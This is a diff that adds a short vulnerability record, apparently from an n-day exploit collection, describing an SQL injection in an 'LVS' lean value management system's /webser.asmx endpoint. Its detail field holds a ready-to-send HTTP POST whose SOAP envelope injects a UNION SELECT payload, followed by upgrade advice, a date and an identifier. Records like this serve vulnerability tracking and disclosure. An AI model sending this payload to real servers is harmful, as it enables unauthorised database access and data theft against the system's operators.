@@ -1,0 +1,14 @@
+vendor = "LVS"
+name = "LVS精益价值管理系统 webser.asmx SQL注入漏洞"
+type = "SQL注入"
+path = "/webser.asmx"
+version = ""
+detail = """POST /webser.asmx HTTP/1.1 Host: target Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AnyMethod xmlns=""><param>1' UNION SELECT @@version--</param></AnyMethod></soap:Body></soap:Envelope>"""
+fix = "升级至最新版本"
+date = 20260415
+label = "nday"
+cve = "TVD-2026-09884"
+verifier = "AdySec"
